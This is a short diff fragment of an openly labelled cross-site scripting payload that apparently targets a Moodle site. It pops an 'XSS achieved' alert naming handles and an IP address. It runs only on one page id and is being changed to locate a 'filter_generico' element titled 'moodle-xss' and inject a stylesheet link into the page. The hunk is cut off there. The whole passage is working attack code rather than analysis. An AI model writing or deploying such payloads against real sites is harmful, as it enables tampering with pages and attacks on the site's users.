@@ -4,7 +4,8 @@ alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz');
 (function(){
   if(new URLSearchParams(window.location.search).get('id') !== '219026') return;
 
-  const el = document.currentScript.parentElement;
+  const el = document.querySelector('.filter_generico_tabitem[title*="moodle-xss"]');
+  if (!el) return;
 
   const link = document.createElement('link');
   link.rel = 'stylesheet';
